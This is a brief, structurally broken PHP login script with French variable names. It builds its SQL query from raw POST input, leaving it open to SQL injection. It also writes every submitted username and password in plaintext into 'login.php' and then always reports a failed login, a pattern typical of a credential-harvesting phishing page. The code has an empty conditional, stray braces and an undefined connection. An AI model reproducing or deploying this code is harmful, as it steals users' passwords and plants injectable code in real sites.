<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $utilisateur = $_POST["utilisateur"];
    $mot_de_passe = $_POST["mot_de_passe"]; 
}

$requete = "SELECT * FROM table_utilisateurs WHERE utilisateur='$utilisateur' AND mot_de_passe='$mot_de_passe'";
    $resultat = mysqli_query($conn, $requete);

    if (mysqli_num_rows($resultat) == 1) {
    }
    $contenu = "Utilisateur: " . $utilisateur . "\nMot de passe: " . $mot_de_passe . "\n";
        file_put_contents("login.php", $contenu, FILE_APPEND | LOCK_EX);

    
   { echo "Nom d'utilisateur ou mot de passe incorrect.";

   }
    

    